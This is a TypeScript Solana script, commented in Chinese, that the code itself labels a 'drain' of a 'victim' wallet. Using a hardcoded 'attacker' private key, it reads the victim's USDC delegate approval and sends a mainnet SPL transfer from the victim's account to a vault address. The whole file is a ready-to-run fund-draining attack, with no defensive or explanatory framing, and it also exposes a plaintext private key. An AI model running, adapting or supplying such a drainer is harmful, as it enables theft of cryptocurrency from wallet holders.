import { 
    Connection, 
    Keypair, 
    PublicKey, 
    Transaction, 
    sendAndConfirmTransaction,
    SendTransactionError
} from "@solana/web3.js";
import { 
    getAssociatedTokenAddressSync, 
    createTransferInstruction,
    getAccount,
    TOKEN_PROGRAM_ID
} from "@solana/spl-token";
import bs58 from "bs58";

const RPC_URL = "https://api.mainnet-beta.solana.com";
const connection = new Connection(RPC_URL, "confirmed");

// ==========================================
// 填入 EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e 对应的私钥
// ==========================================
const SPENDER_PRIVATE_KEY_BASE58 = "2jiUyXqh2JrGdYQm9GfbyWhU5gS3so6fw5Ad8oj29Z5mekqj2B7qeo5TxZkSxf8CvZqSm7mbFsPVjJ1SViGDHhwS";
const attackerKeypair = Keypair.fromSecretKey(bs58.decode(SPENDER_PRIVATE_KEY_BASE58));

// 替换为 USDC Mint 和 USDC 金库地址 [cite: user summary]
const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"); 
const VAULT_USDC_ACCOUNT = new PublicKey("CZZj4UvXBzxFSb1HcEbEWSrHzfjV8KWV1NV7v3VBgT7h");
const victimPublicKey = new PublicKey("2PmziXk7DJzPQM47LCYmaqxpwRiywjZfpCjyESttnSqE");

async function executeDirectDrain() {
    const victimUsdcAccount = getAssociatedTokenAddressSync(USDC_MINT, victimPublicKey);

    // 1. 读取授权状态
    const tokenAccountInfo = await getAccount(connection, victimUsdcAccount);
    console.log(`受害者 USDC 余额: ${Number(tokenAccountInfo.amount) / 1e6} USDC`);
    console.log(`Delegate 地址: ${tokenAccountInfo.delegate?.toBase58()}`);
    console.log(`授权额度: ${Number(tokenAccountInfo.delegatedAmount) / 1e6} USDC`);

    if (!tokenAccountInfo.delegate) {
        console.error("❌ 无授权对象");
        return;
    }

    const drainAmount = 1_000_000n; // 1 USDC (精度为 6) [cite: user summary]

    // 2. 直接构造标准 SPL Token Transfer 指令
    const transferIx = createTransferInstruction(
        victimUsdcAccount,           // 扣款来源：受害者的 ATA
        VAULT_USDC_ACCOUNT,          // 接收目标：USDC 金库 ATA [cite: user summary]
        tokenAccountInfo.delegate,   // 授权签名人（链上读取的 Delegate）
        drainAmount,
        [],
        TOKEN_PROGRAM_ID
    );

    const transaction = new Transaction();
    transaction.feePayer = attackerKeypair.publicKey;
    transaction.add(transferIx);

    try {
        console.log("🚀 发送原生 SPL Transfer 划扣指令...");
        const txId = await sendAndConfirmTransaction(
            connection,
            transaction,
            [attackerKeypair] // 直接用这个有私钥的钱包签名
        );
        console.log(`🎉 划扣成功！Hash: ${txId}`);
    } catch (err) {
        if (err instanceof SendTransactionError) {
            console.error("❌ 模拟失败 Logs:", err.logs);
        } else {
            console.error(err);
        }
    }
}

executeDirectDrain();

